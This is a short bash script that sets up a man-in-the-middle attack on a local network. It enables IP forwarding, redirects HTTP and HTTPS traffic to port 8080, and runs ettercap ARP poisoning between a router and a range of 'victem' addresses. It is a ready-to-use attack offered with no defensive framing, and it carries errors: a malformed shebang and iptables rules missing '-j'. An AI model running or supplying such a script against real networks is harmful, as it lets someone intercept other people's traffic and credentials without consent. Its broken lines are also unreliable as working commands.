#!usr/bin/bash

sysctl -w net.ipv4.ip_forward=1

iptables -t nat -A PREROUTING -p tcp --destination-port 80 REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 443 REDIRECT --to-port 8080

#command works like this:  ettercap -Tq -M arp:remote -i wlan0 -S /<router_ip>// /<victem_ip_range>//
ettercap -Tq -M arp:remote -i wlan0 -S /10.40.1.1// /10.40.1.100-150//


